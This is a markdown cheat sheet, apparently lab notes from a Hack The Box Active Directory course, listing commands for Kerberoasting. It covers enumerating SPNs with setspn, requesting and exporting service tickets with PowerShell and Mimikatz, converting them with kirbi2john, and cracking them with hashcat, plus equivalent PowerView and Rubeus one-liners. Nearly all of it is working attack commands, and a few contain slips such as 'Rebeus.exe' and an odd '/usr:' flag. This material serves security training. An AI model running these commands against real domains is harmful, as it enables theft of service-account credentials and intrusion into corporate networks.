## <span style="color:yellow">Manual</span>

#### Enumerating SPNs with setspn.exe
```shell
C:\htb> setspn.exe -Q */*
```

#### Targeting a Single User / Loading ticket to memory to retrieve 

```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

#### Retrieving All Tickets Using setspn.exe

```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

## Extracting Tickets from Memory with Mimikatz

```c#
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export  
```

#### Preparing the Base64 Blob for Cracking

```shell
Sauuron@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
```


#### Preparing the Base64 Blob for Cracking

```shell
Sauuron@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```

#### using kirbi2john.py

```shell
Sauuron@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
```

#### Modifiying crack_file for Hashcat

```shell
Sauuron@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

#### Cracking the Hash with Hashcat

```shell
Sauuron@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

## <span style="color:yellow">Automated / Tool Based Route</span>

#### Using PowerView to Extract TGS Tickets

```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```


#### Using PowerView to Target a Specific User

```powershell
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```


#### Exporting All Tickets to a CSV File

```powershell
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

#### Using Rubeus

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /stats
```

#### Using the /nowrap Flag

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

#### Cracking with AES256 ($KRB5TGS\$18\$)

```shell
Sauuron@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

#### Using the /tgtdeleg Flag

```powershell
PS C:\htb> .\Rebeus.exe kerberoast /tgtdeleg /usr/:testspn /nowrap
```



